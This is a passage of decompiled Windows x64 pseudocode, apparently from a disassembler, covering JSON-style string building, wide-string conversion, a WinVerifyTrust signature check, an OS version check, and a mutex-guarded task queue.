          *((_BYTE *)v27 + v23) = 0;
          goto LABEL_52;
        }
        break;
      }
      std::_Xlength_error("string too long");
      __debugbreak();
LABEL_55:
      std::_Xlength_error("string too long");
      __debugbreak();
LABEL_56:
      v29 = v14[2];
      if ( -1i64 - v29 <= 1 )
      {
        std::_Xlength_error("string too long");
        __debugbreak();
      }
      v30 = v29 + 1;
      if ( v29 + 1 > 0xFFFFFFFFFFFFFFFEui64 )
      {
        std::_Xlength_error("string too long");
        __debugbreak();
      }
      v31 = v14[3];
      if ( v31 >= v30 )
      {
        if ( v30 )
        {
LABEL_67:
          if ( v14[3] < 0x10ui64 )
            v32 = v14;
          else
            v32 = (_QWORD *)*v14;
          *((_BYTE *)v32 + v14[2]) = 93;
          v14[2] = v30;
          if ( v14[3] >= 0x10ui64 )
            v14 = (_QWORD *)*v14;
          *((_BYTE *)v14 + v30) = 0;
        }
        else
        {
          v14[2] = 0i64;
          if ( v31 >= 0x10 )
            v14 = (_QWORD *)*v14;
          *(_BYTE *)v14 = 0;
        }
      }
      else
      {
        sub_140004790(v14, v30, v29);
        if ( v30 )
          goto LABEL_67;
      }
      return;
    case 7u:
      sub_14006E580((__int64 ****)v2, &v65);
      v33 = (_QWORD *)(v3 + 8);
      v34 = *(_QWORD *)(v3 + 24);
      v35 = -1i64;
      if ( -1i64 - v34 <= 1 )
      {
        std::_Xlength_error("string too long");
        __debugbreak();
      }
      v36 = v34 + 1;
      if ( v34 + 1 > 0xFFFFFFFFFFFFFFFEui64 )
      {
        std::_Xlength_error("string too long");
        __debugbreak();
      }
      v37 = v33[3];
      if ( v37 >= v36 )
      {
        if ( v36 )
          goto LABEL_85;
        v33[2] = 0i64;
        if ( v37 < 0x10 )
          v38 = v33;
        else
          v38 = (_BYTE *)*v33;
        *v38 = 0;
      }
      else
      {
        sub_140004790(v33, v36, v34);
        v35 = -1i64;
      }
      if ( !v36 )
        goto LABEL_92;
LABEL_85:
      if ( v33[3] < 0x10ui64 )
        v39 = v33;
      else
        v39 = (_QWORD *)*v33;
      *((_BYTE *)v39 + v33[2]) = 123;
      v33[2] = v36;
      if ( v33[3] < 0x10ui64 )
        v40 = v33;
      else
        v40 = (_QWORD *)*v33;
      *((_BYTE *)v40 + v36) = 0;
LABEL_92:
      v41 = (void **)v65;
      v42 = (void **)v65;
      if ( v65 == v66 )
        goto LABEL_125;
      while ( 2 )
      {
        if ( v42 == v41 )
          goto LABEL_111;
        v43 = v33[2];
        if ( v35 - v43 <= 1 )
          goto LABEL_124;
        v44 = v43 + 1;
        if ( v43 + 1 <= 0xFFFFFFFFFFFFFFFEui64 )
        {
          v45 = v33[3];
          if ( v45 >= v44 )
          {
            if ( v43 != -1i64 )
            {
LABEL_104:
              if ( v33[3] < 0x10ui64 )
                v47 = v33;
              else
                v47 = (_QWORD *)*v33;
              *((_BYTE *)v47 + v33[2]) = 44;
              v33[2] = v44;
              if ( v33[3] < 0x10ui64 )
                v48 = v33;
              else
                v48 = (_QWORD *)*v33;
              *((_BYTE *)v48 + v44) = 0;
LABEL_111:
              if ( (unsigned __int64)v42[3] >= 0x10 )
                v49 = *v42;
              v50 = *((unsigned int *)v42 + 4);
              v51 = (_QWORD *)sub_140072880(&v68);
              sub_140004B80(v33, v51, 0i64, 0xFFFFFFFFFFFFFFFFui64);
              if ( v70 >= 0x10 )
                operator delete(v68);
              v70 = 15i64;
              v69 = 0i64;
              LOBYTE(v68) = 0;
              v52 = (char *)&unk_1400AF090;
              if ( *(_BYTE *)(v62 + 40) )
                v52 = ": ";
              if ( *v52 )
              {
                v53 = -1i64;
                do
                  ++v53;
                while ( v52[v53] );
              }
              else
              {
                v53 = 0i64;
              }
              sub_140004CA0(v33, v52, v53);
              v54 = sub_14006C4D0((__int64)v63, v42);
              sub_140073360(v62, v54);
              v42 += 4;
              v41 = (void **)v65;
              if ( v42 != v66 )
              {
                v35 = -1i64;
                continue;
              }
              goto LABEL_125;
            }
            v33[2] = 0i64;
            if ( v45 < 0x10 )
              v46 = v33;
            else
              v46 = (_BYTE *)*v33;
            *v46 = 0;
          }
          else
          {
            sub_140004790(v33, v43 + 1, v43);
          }
          if ( !v44 )
            goto LABEL_111;
          goto LABEL_104;
        }
        break;
      }
      std::_Xlength_error("string too long");
      __debugbreak();
LABEL_124:
      std::_Xlength_error("string too long");
      __debugbreak();
LABEL_125:
      v55 = v33[2];
      if ( -1i64 - v55 <= 1 )
      {
        std::_Xlength_error("string too long");
        __debugbreak();
      }
      v56 = v55 + 1;
      if ( v55 + 1 > 0xFFFFFFFFFFFFFFFEui64 )
      {
        std::_Xlength_error("string too long");
        __debugbreak();
      }
      v57 = v33[3];
      if ( v57 >= v56 )
      {
        if ( v56 )
        {
LABEL_137:
          if ( v33[3] < 0x10ui64 )
            v60 = v33;
          else
            v60 = (_QWORD *)*v33;
          *((_BYTE *)v60 + v33[2]) = 125;
          v33[2] = v56;
          if ( v33[3] >= 0x10ui64 )
            v33 = (_QWORD *)*v33;
          *((_BYTE *)v33 + v56) = 0;
          v59 = (void **)v65;
LABEL_143:
          if ( v59 )
          {
            v61 = v66;
            if ( v59 != v66 )
            {
              do
              {
                if ( (unsigned __int64)v59[3] >= 0x10 )
                  operator delete(*v59);
                v59[3] = (void *)15;
                v59[2] = 0i64;
                *(_BYTE *)v59 = 0;
                v59 += 4;
              }
              while ( v59 != v61 );
              v59 = (void **)v65;
            }
            v6 = v59;
LABEL_150:
            operator delete(v6);
          }
          return;
        }
        v33[2] = 0i64;
        if ( v57 < 0x10 )
          v58 = v33;
        else
          v58 = (_BYTE *)*v33;
        *v58 = 0;
      }
      else
      {
        sub_140004790(v33, v56, v55);
      }
      v59 = (void **)v65;
      if ( !v56 )
        goto LABEL_143;
      goto LABEL_137;
    default:
      return;
  }
}
// 14006D2D0: using guessed type __int64 __fastcall sub_14006D2D0(_QWORD);
// 14006D2E0: using guessed type __int64 __fastcall sub_14006D2E0(_QWORD);
// 14006F340: using guessed type __int64 __fastcall DName::status(_QWORD);
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);

//----- (0000000140073AC0) ----------------------------------------------------
void __fastcall sub_140073AC0(void *Src, char *a2, char *a3)
{
  _QWORD *v3; // rbx
  unsigned __int64 v4; // rax
  unsigned __int64 v5; // rdi
  _WORD *v6; // rax
  __int16 v7; // r14
  __int64 v8; // r8
  unsigned __int64 v9; // rdi
  unsigned __int64 v10; // rax
  _WORD *v11; // rax
  _QWORD *v12; // rax
  _QWORD *v13; // rax
  char *v14; // [rsp+68h] [rbp+10h]
  char *v15; // [rsp+70h] [rbp+18h]

  v15 = a3;
  v14 = a2;
  v3 = Src;
  v4 = a3 - a2;
  v5 = *((_QWORD *)Src + 2);
  if ( v5 <= a3 - a2 && *((_QWORD *)Src + 3) != v4 && sub_140004A90((__int64 *)Src, v4, 1) )
  {
    v3[2] = v5;
    if ( v3[3] < 8ui64 )
      v6 = v3;
    else
      v6 = (_WORD *)*v3;
    v6[v5] = 0;
  }
  while ( v14 != v15 )
  {
    v7 = *v14;
    v8 = v3[2];
    if ( (unsigned __int64)(-1 - v8) <= 1 )
      std::_Xlength_error("string too long");
    v9 = v8 + 1;
    if ( (unsigned __int64)(v8 + 1) > 0x7FFFFFFFFFFFFFFEi64 )
      std::_Xlength_error("string too long");
    v10 = v3[3];
    if ( v10 < v9 )
    {
      sub_1400048A0(v3, v9, v8);
      if ( !v9 )
        goto LABEL_28;
LABEL_21:
      if ( v3[3] < 8ui64 )
        v12 = v3;
      else
        v12 = (_QWORD *)*v3;
      *((_WORD *)v12 + v3[2]) = v7;
      v3[2] = v9;
      if ( v3[3] < 8ui64 )
        v13 = v3;
      else
        v13 = (_QWORD *)*v3;
      *((_WORD *)v13 + v9) = 0;
      goto LABEL_28;
    }
    if ( v9 )
      goto LABEL_21;
    v3[2] = 0i64;
    if ( v10 < 8 )
      v11 = v3;
    else
      v11 = (_WORD *)*v3;
    *v11 = 0;
LABEL_28:
    ++v14;
  }
}
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);

//----- (0000000140073C10) ----------------------------------------------------
__int64 *__fastcall sub_140073C10(__int64 *a1, __int64 a2, __int64 a3, char *a4, char *a5)
{
  __int64 *v5; // rbx
  __int64 v6; // rax
  unsigned __int64 v7; // r8
  unsigned __int64 v8; // rdx
  void *v10; // [rsp+40h] [rbp-38h]
  __int64 v11; // [rsp+50h] [rbp-28h]
  unsigned __int64 v12; // [rsp+58h] [rbp-20h]
  __int64 v13; // [rsp+88h] [rbp+10h]
  __int64 v14; // [rsp+90h] [rbp+18h]

  v14 = a3;
  v13 = a2;
  v5 = a1;
  v12 = 7i64;
  v11 = 0i64;
  LOWORD(v10) = 0;
  sub_140073AC0(&v10, a4, a5);
  if ( (unsigned __int64)v5[3] < 8 )
    v6 = (__int64)v5;
  else
    v6 = *v5;
  if ( v14 )
    v7 = (v14 - v13) >> 1;
  else
    v7 = 0i64;
  if ( v13 )
    v8 = (v13 - v6) >> 1;
  else
    v8 = 0i64;
  sub_14002EA40(v5, v8, v7, (__int64 *)&v10, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  if ( v12 >= 8 )
    operator delete(v10);
  return v5;
}

//----- (0000000140073D00) ----------------------------------------------------
bool __fastcall sub_140073D00(const CHAR *a1)
{
  char *v1; // rbx
  HANDLE v2; // rdi
  unsigned __int64 v3; // rdx
  __int64 *v4; // rcx
  char *v5; // rax
  void *v6; // rax
  bool v7; // bl
  __int64 v9; // [rsp+40h] [rbp-B8h]
  void *v10; // [rsp+48h] [rbp-B0h]
  HANDLE v11; // [rsp+50h] [rbp-A8h]
  __int64 v12; // [rsp+58h] [rbp-A0h]
  __int64 v13; // [rsp+60h] [rbp-98h]
  int Dst; // [rsp+70h] [rbp-88h]
  int v15; // [rsp+80h] [rbp-78h]
  int v16; // [rsp+88h] [rbp-70h]
  __int64 *v17; // [rsp+90h] [rbp-68h]
  int v18; // [rsp+98h] [rbp-60h]
  int v19; // [rsp+B0h] [rbp-48h]
  GUID pgActionID; // [rsp+C8h] [rbp-30h]
  void *v21; // [rsp+D8h] [rbp-20h]
  __int64 v22; // [rsp+E8h] [rbp-10h]
  unsigned __int64 v23; // [rsp+F0h] [rbp-8h]

  v13 = -2i64;
  v1 = (char *)a1;
  if ( *((_QWORD *)a1 + 3) >= 0x10ui64 )
    a1 = *(const CHAR **)a1;
  v2 = CreateFileA(a1, 0x80000000, 1u, 0i64, 3u, 0, 0i64);
  if ( v2 == (HANDLE)-1i64 )
    return 0;
  v9 = 0i64;
  v10 = 0i64;
  v11 = 0i64;
  v12 = 0i64;
  LODWORD(v9) = 32;
  v23 = 7i64;
  v22 = 0i64;
  LOWORD(v21) = 0;
  v3 = *((_QWORD *)v1 + 3);
  if ( v3 < 0x10 )
    v4 = (__int64 *)v1;
  else
    v4 = *(__int64 **)v1;
  v5 = (char *)v4 + *((_QWORD *)v1 + 2);
  if ( v3 >= 0x10 )
    v1 = *(char **)v1;
  sub_140073C10((__int64 *)&v21, (__int64)&v21, (__int64)&v21, v1, v5);
  v6 = &v21;
  if ( v23 >= 8 )
    v6 = v21;
  v10 = v6;
  v11 = v2;
  memset(&Dst, 0, 0x58ui64);
  Dst = 88;
  v15 = 2;
  v16 = 1;
  v18 = 1;
  v19 = 16;
  v17 = &v9;
  pgActionID.Data1 = 11191659;
  *(_DWORD *)&pgActionID.Data2 = 298896708;
  *(_DWORD *)pgActionID.Data4 = -1073692020;
  *(_DWORD *)&pgActionID.Data4[4] = -292175281;
  v7 = WinVerifyTrust(HWND_MESSAGE|0x2, &pgActionID, &Dst) == 0;
  v18 = 2;
  WinVerifyTrust(HWND_MESSAGE|0x2, &pgActionID, &Dst);
  CloseHandle(v2);
  if ( v23 >= 8 )
    operator delete(v21);
  return v7;
}

//----- (0000000140073ED0) ----------------------------------------------------
bool sub_140073ED0()
{
  return sub_140073EE0(6u, 2u, 0);
}

//----- (0000000140073EE0) ----------------------------------------------------
bool __fastcall sub_140073EE0(unsigned __int16 a1, unsigned __int16 a2, WORD a3)
{
  DWORD v3; // ebx
  WORD v4; // bp
  DWORD v5; // edi
  ULONGLONG v6; // rax
  ULONGLONG v7; // rax
  DWORDLONG v8; // rax
  struct _OSVERSIONINFOEXW VersionInformation; // [rsp+20h] [rbp-148h]

  v3 = a1;
  v4 = a3;
  v5 = a2;
  *(_QWORD *)&VersionInformation.dwOSVersionInfoSize = 284i64;
  *(_QWORD *)&VersionInformation.dwMinorVersion = 0i64;
  VersionInformation.dwPlatformId = 0;
  VersionInformation.szCSDVersion[0] = 0;
  memset(&VersionInformation.szCSDVersion[1], 0, 0xFEui64);
  *(_QWORD *)&VersionInformation.wServicePackMajor = 0i64;
  v6 = VerSetConditionMask(0i64, 2u, 3u);
  v7 = VerSetConditionMask(v6, 1u, 3u);
  v8 = VerSetConditionMask(v7, 0x20u, 3u);
  VersionInformation.dwMajorVersion = v3;
  VersionInformation.dwMinorVersion = v5;
  VersionInformation.wServicePackMajor = v4;
  return VerifyVersionInfoW(&VersionInformation, 0x23u, v8) != 0;
}

//----- (0000000140073FC0) ----------------------------------------------------
__int64 __fastcall sub_140073FC0(__int64 a1, signed __int64 a2, signed __int64 a3, _QWORD *a4)
{
  signed __int64 v4; // r10
  _QWORD *v5; // r15
  signed __int64 v6; // rbp
  __int64 v7; // r14
  signed __int64 i; // rdi
  _QWORD *v9; // r8
  _QWORD *v10; // rdx
  __int64 v11; // rax
  __int64 v12; // r9
  volatile signed __int32 *v13; // rcx
  _QWORD *v14; // rdx
  __int64 result; // rax
  __int64 v16; // r8
  volatile signed __int32 *v17; // rcx
  volatile signed __int32 *v18; // [rsp+28h] [rbp-30h]
  volatile signed __int32 *v19; // [rsp+38h] [rbp-20h]

  v4 = a2;
  v5 = a4;
  v6 = a3;
  v7 = a1;
  for ( i = (a2 - 1) / 2; v6 < v4; i = (i - 1) / 2 )
  {
    v9 = (_QWORD *)(v7 + 24 * i);
    if ( *(_QWORD *)(v7 + 24 * i) >= *v5 )
      break;
    v10 = (_QWORD *)(v7 + 24 * v4);
    *v10 = *v9;
    v11 = v9[2];
    v12 = v9[1];
    if ( v11 )
      _InterlockedIncrement((volatile signed __int32 *)(v11 + 8));
    v13 = (volatile signed __int32 *)v10[2];
    v10[2] = v11;
    v10[1] = v12;
    v18 = v13;
    if ( v13 )
    {
      if ( !_InterlockedDecrement(v13 + 2) )
      {
        (**(void (__fastcall ***)(volatile signed __int32 *))v13)(v13);
        if ( !_InterlockedDecrement(v18 + 3) )
          (*(void (**)(void))(*(_QWORD *)v18 + 8i64))();
      }
    }
    v4 = i;
  }
  v14 = (_QWORD *)(v7 + 24 * v4);
  *v14 = *v5;
  result = v5[2];
  v16 = v5[1];
  if ( result )
    _InterlockedIncrement((volatile signed __int32 *)(result + 8));
  v17 = (volatile signed __int32 *)v14[2];
  v14[2] = result;
  v14[1] = v16;
  v19 = v17;
  if ( v17 && !_InterlockedDecrement(v17 + 2) )
  {
    result = (**(__int64 (__fastcall ***)(volatile signed __int32 *))v17)(v17);
    if ( !_InterlockedDecrement(v19 + 3) )
      result = (*(__int64 (**)(void))(*(_QWORD *)v19 + 8i64))();
  }
  return result;
}

//----- (0000000140074100) ----------------------------------------------------
__int64 __fastcall sub_140074100(__int64 a1, __int64 *a2)
{
  __int64 *v2; // r9
  __int64 v3; // rdi
  unsigned __int64 v4; // rdx
  __int64 result; // rax
  signed __int64 v6; // rbx
  __int64 v7; // r8
  __int64 v8; // rdx
  __int64 v9; // rbx
  __int64 v10; // [rsp+38h] [rbp-20h]
  __m128i v11; // [rsp+40h] [rbp-18h]

  v2 = a2;
  v3 = a1;
  v4 = (unsigned __int128)(((signed __int64)a2 - a1) * (signed __int128)3074457345618258603i64) >> 64;
  result = v4 >> 63;
  v6 = (v4 >> 63) + ((signed __int64)v4 >> 2);
  if ( v6 > 0 )
  {
    v10 = *v2;
    _mm_storeu_si128(&v11, (__m128i)0i64);
    v7 = v2[2];
    v8 = v2[1];
    if ( v7 )
      _InterlockedIncrement((volatile signed __int32 *)(v7 + 8));
    sub_140029830(&v11, v8, v7);
    result = sub_140073FC0(v3, v6, 0i64, &v10);
    if ( v11.m128i_i64[1] && !_InterlockedDecrement((volatile signed __int32 *)(v11.m128i_i64[1] + 8)) )
    {
      v9 = v11.m128i_i64[1];
      result = (**(__int64 (__fastcall ***)(__int64))v11.m128i_i64[1])(v11.m128i_i64[1]);
      if ( !_InterlockedDecrement((volatile signed __int32 *)(v9 + 12)) )
        result = (*(__int64 (__cdecl **)(__int64))(*(_QWORD *)v11.m128i_i64[1] + 8i64))(v11.m128i_i64[1]);
    }
  }
  return result;
}

//----- (00000001400741D0) ----------------------------------------------------
__int64 __fastcall sub_1400741D0(_QWORD *a1, __int64 a2)
{
  __int64 v2; // rbx
  _QWORD *v3; // rdi
  _DWORD *v4; // rax

  v2 = a2;
  v3 = a1;
  v4 = operator new(0x18ui64);
  if ( v4 )
  {
    v4[2] = 1;
    v4[3] = 1;
    *(_QWORD *)v4 = &off_1400AF400;
    *((_QWORD *)v4 + 2) = v2;
  }
  return sub_140029830(v3, v2, (__int64)v4);
}
// 1400AF400: using guessed type __int64 (__fastcall *off_1400AF400)();

//----- (00000001400742B0) ----------------------------------------------------
_QWORD *__fastcall sub_1400742B0(_QWORD *a1, _QWORD *a2, _QWORD *a3)
{
  _QWORD *v3; // rbx
  _QWORD *v4; // r12
  _QWORD *i; // rsi
  __int64 v6; // r14
  __int64 v7; // r15
  volatile signed __int32 *v8; // rdi

  v3 = a3;
  v4 = a2;
  for ( i = a1; i != v4; i += 3 )
  {
    if ( v3 )
    {
      *v3 = *i;
      v3[1] = 0i64;
      v3[2] = 0i64;
      v6 = i[2];
      v7 = i[1];
      if ( v6 )
        _InterlockedIncrement((volatile signed __int32 *)(v6 + 8));
      v8 = (volatile signed __int32 *)v3[2];
      if ( v8 && !_InterlockedDecrement(v8 + 2) )
      {
        (**(void (__fastcall ***)(volatile signed __int32 *))v8)(v8);
        if ( !_InterlockedDecrement(v8 + 3) )
          (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v8 + 8i64))(v8);
      }
      v3[2] = v6;
      v3[1] = v7;
    }
    v3 += 3;
  }
  return v3;
}

//----- (0000000140074370) ----------------------------------------------------
__int64 *__fastcall sub_140074370(__int64 *a1, __int64 *a2, __int64 *a3)
{
  __int64 *i; // r9
  __int64 v4; // rcx

  for ( i = a1; i != a2; i += 2 )
  {
    if ( a3 )
    {
      *a3 = 0i64;
      a3[1] = 0i64;
      if ( a3 != i )
      {
        a3[1] = i[1];
        i[1] = 0i64;
        v4 = *a3;
        *a3 = *i;
        *i = v4;
      }
    }
    a3 += 2;
  }
  return a3;
}

//----- (00000001400743E0) ----------------------------------------------------
__int64 __fastcall sub_1400743E0(__int64 a1, __int64 a2)
{
  volatile signed __int32 *v2; // rbx
  __int64 result; // rax

  v2 = *(volatile signed __int32 **)(a2 + 16);
  if ( v2 && !_InterlockedDecrement(v2 + 2) )
  {
    result = (**(__int64 (__fastcall ***)(volatile signed __int32 *))v2)(v2);
    if ( !_InterlockedDecrement(v2 + 3) )
      result = (*(__int64 (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v2 + 8i64))(v2);
  }
  return result;
}

//----- (0000000140074420) ----------------------------------------------------
__int64 __fastcall sub_140074420(_QWORD *a1, __int64 a2)
{
  _QWORD *v2; // rbx
  __int64 v3; // rcx
  __int64 v4; // rax
  __int64 result; // rax
  __int64 v6; // rbx
  __m128i v7; // [rsp+20h] [rbp-18h]

  v2 = a1;
  _mm_storeu_si128(&v7, (__m128i)0i64);
  sub_1400741D0(&v7, a2);
  v4 = v7.m128i_i64[1];
  v7.m128i_i64[1] = v2[1];
  v3 = v7.m128i_i64[1];
  v2[1] = v4;
  result = v7.m128i_i64[0];
  *v2 = v7.m128i_i64[0];
  if ( v3 && !_InterlockedDecrement((volatile signed __int32 *)(v3 + 8)) )
  {
    v6 = v7.m128i_i64[1];
    result = (**(__int64 (__fastcall ***)(__int64))v7.m128i_i64[1])(v7.m128i_i64[1]);
    if ( !_InterlockedDecrement((volatile signed __int32 *)(v6 + 12)) )
      result = (*(__int64 (**)(void))(*(_QWORD *)v7.m128i_i64[1] + 8i64))();
  }
  return result;
}

//----- (0000000140074490) ----------------------------------------------------
void __fastcall sub_140074490(_QWORD *a1)
{
  signed __int64 v1; // rcx
  unsigned int v2; // eax
  __m128i v3; // [rsp+20h] [rbp-38h]
  char v4; // [rsp+30h] [rbp-28h]

  if ( *a1 > 0i64 )
  {
    v1 = 1000000i64 * *a1 + 100 * Xtime_get_ticks();
    v3.m128i_i64[0] = ((unsigned __int64)((unsigned __int128)(v1 * (signed __int128)1237940039285380275i64) >> 64) >> 63)
                    + ((signed __int64)((unsigned __int128)(v1 * (signed __int128)1237940039285380275i64) >> 64) >> 26);
    v3.m128i_i32[2] = v1 - 1000000000 * v3.m128i_i32[0];
  }
  else
  {
    v3.m128i_i64[0] = 0i64;
    v3.m128i_i32[2] = 0;
  }
  _mm_store_si128(&v3, v3);
  if ( (unsigned int)Concurrency::details::_CurrentScheduler::_Id() == -1 )
  {
    Thrd_sleep(&v3);
  }
  else
  {
    xtime_get(&v4, 1i64);
    v2 = Xtime_diff_to_millis2(&v3, &v4);
    Concurrency::wait(v2);
  }
}
// 1400A14A8: using guessed type __int64 __fastcall Thrd_sleep(_QWORD);
// 1400A14B0: using guessed type __int64 Xtime_get_ticks(void);
// 1400A14B8: using guessed type __int64 __fastcall Xtime_diff_to_millis2(_QWORD, _QWORD);
// 1400A14C0: using guessed type __int64 __fastcall xtime_get(_QWORD, _QWORD);
// 1400A1878: using guessed type void __stdcall Concurrency::wait(unsigned int);
// 1400A1A48: using guessed type __int64 Concurrency::details::_CurrentScheduler::_Id(void);

//----- (0000000140074570) ----------------------------------------------------
_QWORD *__fastcall sub_140074570(_BYTE *a1)
{
  _QWORD *v1; // rbx
  int v2; // eax
  int v3; // eax

  v1 = a1;
  *a1 = 0;
  v2 = Mtx_init(a1 + 8, 2i64);
  if ( v2 )
    std::_Throw_C_error(v2);
  v1[2] = 0i64;
  v1[3] = 0i64;
  v1[4] = 0i64;
  v3 = Cnd_init(v1 + 6);
  if ( v3 )
    std::_Throw_C_error(v3);
  return v1;
}
// 1400A14A0: using guessed type __int64 __fastcall Cnd_init(_QWORD);
// 1400A1610: using guessed type void __stdcall std::_Throw_C_error(_DWORD);
// 1400A1630: using guessed type __int64 __fastcall Mtx_init(_QWORD, _QWORD);

//----- (00000001400745E0) ----------------------------------------------------
_QWORD *__fastcall sub_1400745E0(_QWORD *a1)
{
  _QWORD *v1; // rdi
  _QWORD *v2; // rbx
  int v3; // eax
  _BYTE *v4; // rax

  v1 = a1;
  *a1 = &off_1400AF3B8;
  v2 = 0i64;
  a1[1] = 0i64;
  a1[2] = 0i64;
  a1[3] = 0i64;
  a1[4] = 0i64;
  a1[5] = 0i64;
  a1[6] = 0i64;
  a1[7] = 0i64;
  v3 = Mtx_init(a1 + 8, 2i64);
  if ( v3 )
    std::_Throw_C_error(v3);
  v4 = operator new(0x38ui64);
  if ( v4 )
    v2 = sub_140074570(v4);
  sub_140074420(v1 + 4, (__int64)v2);
  return v1;
}
// 1400A1610: using guessed type void __stdcall std::_Throw_C_error(_DWORD);
// 1400A1630: using guessed type __int64 __fastcall Mtx_init(_QWORD, _QWORD);
// 1400AF3B8: using guessed type __int64 (__fastcall *off_1400AF3B8)(void *);

//----- (0000000140074690) ----------------------------------------------------
__int64 __fastcall sub_140074690(volatile signed __int32 ***a1)
{
  volatile signed __int32 ***v1; // rbx
  __int64 result; // rax

  v1 = a1;
  if ( *a1 )
  {
    sub_140074FC0((__int64)a1, *a1, a1[1]);
    operator delete(*v1);
    result = 0i64;
    *v1 = 0i64;
    v1[1] = 0i64;
    v1[2] = 0i64;
  }
  return result;
}

//----- (00000001400746D0) ----------------------------------------------------
__int64 __fastcall sub_1400746D0(__int64 a1)
{
  volatile signed __int32 *v1; // rbx
  __int64 result; // rax

  v1 = *(volatile signed __int32 **)(a1 + 16);
  if ( v1 && !_InterlockedDecrement(v1 + 2) )
  {
    result = (**(__int64 (__fastcall ***)(volatile signed __int32 *))v1)(v1);
    if ( !_InterlockedDecrement(v1 + 3) )
      result = (*(__int64 (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v1 + 8i64))(v1);
  }
  return result;
}

//----- (0000000140074710) ----------------------------------------------------
_QWORD *__fastcall sub_140074710(_QWORD *a1, __int64 *a2)
{
  __int64 v2; // rax
  __int64 v3; // r8
  _QWORD *v4; // rdi
  volatile signed __int32 *v5; // rcx
  volatile signed __int32 *v7; // [rsp+28h] [rbp-10h]

  v2 = a2[1];
  v3 = *a2;
  v4 = a1;
  if ( v2 )
    _InterlockedIncrement((volatile signed __int32 *)(v2 + 8));
  v5 = (volatile signed __int32 *)a1[1];
  v4[1] = v2;
  *v4 = v3;
  v7 = v5;
  if ( !v5 )
    return v4;
  if ( !_InterlockedDecrement(v5 + 2) )
  {
    (**(void (__fastcall ***)(volatile signed __int32 *))v5)(v5);
    if ( !_InterlockedDecrement(v7 + 3) )
      (*(void (**)(void))(*(_QWORD *)v7 + 8i64))();
  }
  return v4;
}

//----- (0000000140074790) ----------------------------------------------------
char *__fastcall sub_140074790(void *a1, char a2)
{
  char *v2; // rbx
  char v3; // si
  volatile signed __int32 **v4; // rdx

  v2 = (char *)a1;
  v3 = a2;
  Cnd_destroy((char *)a1 + 48);
  v4 = (volatile signed __int32 **)*((_QWORD *)v2 + 2);
  if ( v4 )
  {
    sub_140074FC0((__int64)(v2 + 16), v4, *((volatile signed __int32 ***)v2 + 3));
    operator delete(*((void **)v2 + 2));
    *((_QWORD *)v2 + 2) = 0i64;
    *((_QWORD *)v2 + 3) = 0i64;
    *((_QWORD *)v2 + 4) = 0i64;
  }
  _Mtx_destroy(v2 + 8);
  if ( v3 & 1 )
    operator delete(v2);
  return v2;
}
// 1400A1498: using guessed type __int64 __fastcall Cnd_destroy(_QWORD);
// 1400A1628: using guessed type __int64 __fastcall _Mtx_destroy(_QWORD);

//----- (0000000140074810) ----------------------------------------------------
void *__fastcall sub_140074810(void *a1, char a2)
{
  char v2; // bl
  void *v3; // rdi

  v2 = a2;
  v3 = a1;
  sub_140024160((__int64)a1);
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}

//----- (0000000140074840) ----------------------------------------------------
void __fastcall sub_140074840(__int64 a1, __int64 *a2, __int64 a3)
{
  __int64 v3; // rsi
  __int64 *v4; // rbx
  __int64 v5; // rdi
  int v6; // eax
  volatile signed __int32 *v7; // rax
  __int64 v8; // rcx
  __int64 v9; // rdx
  __int64 v10; // rcx
  __int64 v11; // r8
  int v12; // eax
  volatile signed __int32 *v13; // rbx
  int v14; // eax
  signed __int64 v15; // [rsp+38h] [rbp-30h]
  __int64 v16; // [rsp+48h] [rbp-20h]
  __int64 v17; // [rsp+50h] [rbp-18h]
  volatile signed __int32 *v18; // [rsp+58h] [rbp-10h]

  v3 = a3;
  v4 = a2;
  v5 = a1;
  v15 = a1 + 8;
  v6 = Mtx_lock(a1 + 8);
  if ( v6 )
    std::_Throw_C_error(v6);
  v7 = (volatile signed __int32 *)v4[1];
  v8 = *v4;
  if ( v7 )
    _InterlockedIncrement(v7 + 2);
  v18 = v7;
  v17 = v8;
  v16 = v3;
  sub_140075320(v5 + 16, &v16);
  v9 = *(_QWORD *)(v5 + 24);
  v10 = *(_QWORD *)(v5 + 16);
  if ( v10 != v9 )
  {
    v11 = *(unsigned __int8 *)(v5 + 40);
    sub_140074100(v10, (__int64 *)(v9 - 24));
  }
  v12 = Cnd_broadcast(v5 + 48);
  if ( v12 )
    std::_Throw_C_error(v12);
  if ( v18 )
  {
    if ( !_InterlockedDecrement(v18 + 2) )
    {
      v13 = v18;
      (**(void (__fastcall ***)(volatile signed __int32 *))v18)(v18);
      if ( !_InterlockedDecrement(v13 + 3) )
        (*(void (__cdecl **)(volatile signed __int32 *))(*(_QWORD *)v18 + 8i64))(v18);
    }
  }
  v14 = Mtx_unlock(v15);
  if ( v14 )
    std::_Throw_C_error(v14);
}
// 1400A1490: using guessed type __int64 __fastcall Cnd_broadcast(_QWORD);
// 1400A1610: using guessed type void __stdcall std::_Throw_C_error(_DWORD);
// 1400A1618: using guessed type __int64 __fastcall Mtx_unlock(_QWORD);
// 1400A1620: using guessed type __int64 __fastcall Mtx_lock(_QWORD);

//----- (0000000140074950) ----------------------------------------------------
char __fastcall sub_140074950(__int64 a1, __int64 *a2, __int64 a3)
{
  __int64 v3; // rbp
  __int64 *v4; // r14
  __int64 v5; // rbx
  char *v6; // rdi
  signed __int64 v7; // rsi
  int v8; // eax
  char v9; // di
  int v10; // eax
  int v11; // eax
  int v12; // eax
  __int64 v14; // [rsp+60h] [rbp+8h]

  v3 = a3;
  v4 = a2;
  v5 = a1;
  v6 = *(char **)(a1 + 32);
  v7 = (signed __int64)(v6 + 8);
  v8 = Mtx_lock(v6 + 8);
  if ( v8 )
    std::_Throw_C_error(v8);
  v9 = *v6;
  v10 = Mtx_unlock(v7);
  if ( v10 )
    std::_Throw_C_error(v10);
  if ( !v9 )
    return 0;
  v11 = Mtx_lock(v5 + 64);
  if ( v11 )
    std::_Throw_C_error(v11);
  if ( !sub_140074C30(*(_QWORD *)(v5 + 32)) && sub_140074BE0(v5) )
    sub_140074A50(v5, *(_QWORD *)(v5 + 56));
  sub_140074840(*(_QWORD *)(v5 + 32), v4, v3);
  v14 = 1i64;
  sub_140074490(&v14);
  v12 = Mtx_unlock(v5 + 64);
  if ( v12 )
    std::_Throw_C_error(v12);
  return 1;
}
